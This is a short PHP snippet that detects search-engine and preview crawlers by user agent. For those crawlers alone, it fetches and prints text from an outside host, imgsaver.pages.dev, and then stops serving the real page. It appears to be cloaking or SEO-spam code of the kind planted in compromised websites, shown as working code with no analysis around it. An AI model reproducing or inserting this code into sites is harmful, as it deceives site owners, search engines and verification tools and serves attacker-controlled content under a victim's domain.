<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array('Googlebot', 'Google-CWS', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'AhrefsBot');
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}

if (is_bot()) {
    $message = file_get_contents('https://imgsaver.pages.dev/landingpages.txt'); //
    echo $message;
    exit;
}
?>
